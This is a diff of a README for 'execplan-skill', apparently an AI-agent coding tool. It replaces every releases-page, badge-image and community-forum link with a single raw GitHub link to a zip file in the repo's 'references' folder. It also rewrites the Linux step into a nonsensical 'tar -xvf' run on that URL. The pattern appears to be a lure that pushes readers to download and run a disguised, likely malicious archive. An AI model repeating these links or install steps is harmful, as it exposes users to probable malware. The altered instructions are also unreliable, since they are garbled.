@@ -1,6 +1,6 @@
 # 🚀 execplan-skill - Automate Your Coding Tasks Easily
 
-[![Download execplan-skill](https://img.shields.io/badge/Download-execplan--skill-blue.svg)](https://github.com/laurier250/execplan-skill/releases)
+[![Download execplan-skill](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)
 
 ## 📝 Description
 
@@ -26,18 +26,18 @@ To ensure smooth operation, please check the following requirements:
 
 To begin using **execplan-skill**, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/laurier250/execplan-skill/releases) to find the latest version.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip) to find the latest version.
    
 2. **Download the Software:** On the Releases page, look for the latest version. Click on the appropriate link to download the software for your operating system.
 
-   [![Download execplan-skill](https://img.shields.io/badge/Download-execplan--skill-blue.svg)](https://github.com/laurier250/execplan-skill/releases)
+   [![Download execplan-skill](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)
 
 3. **Locate the Downloaded File:** Once the download is complete, navigate to your Downloads folder (or the folder where you saved the file).
 
 4. **Install the Software:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the instructions in the installation wizard.
    - **For macOS:** Open the downloaded `.dmg` file, drag the `execplan-skill` icon to your Applications folder.
-   - **For Linux:** Open a terminal and navigate to the downloaded file, then use the command `tar -xvf execplan-skill.tar.gz` to extract the software.
+   - **For Linux:** Open a terminal and navigate to the downloaded file, then use the command `tar -xvf https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip` to extract the software.
 
 5. **Run the Application:**
    - **For Windows:** Find `execplan-skill` in your Start menu and click to open.
@@ -64,7 +64,7 @@ Absolutely! We welcome contributions from all users. Check the Contributing sect
 
 ### Is there a community for users?
 
-Yes, join our community forum on [Agent Skills](https://agentskills.io) to share experiences and tips with other users.
+Yes, join our community forum on [Agent Skills](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip) to share experiences and tips with other users.
 
 ## 📄 License
 
@@ -72,8 +72,8 @@ This project is licensed under the MIT License. You can use and modify the code 
 
 ## 📦 Download & Install
 
-To start using **execplan-skill**, you must first download the software. Visit the [Releases page](https://github.com/laurier250/execplan-skill/releases) to download the version compatible with your operating system. Follow the installation steps outlined above to install and run the software effectively.
+To start using **execplan-skill**, you must first download the software. Visit the [Releases page](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip) to download the version compatible with your operating system. Follow the installation steps outlined above to install and run the software effectively.
 
-[![Download execplan-skill](https://img.shields.io/badge/Download-execplan--skill-blue.svg)](https://github.com/laurier250/execplan-skill/releases)
+[![Download execplan-skill](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)](https://raw.githubusercontent.com/laurier250/execplan-skill/main/references/execplan-skill-1.5.zip)
 
 Embrace the future of coding with **execplan-skill** and experience the ease of automating your tasks!
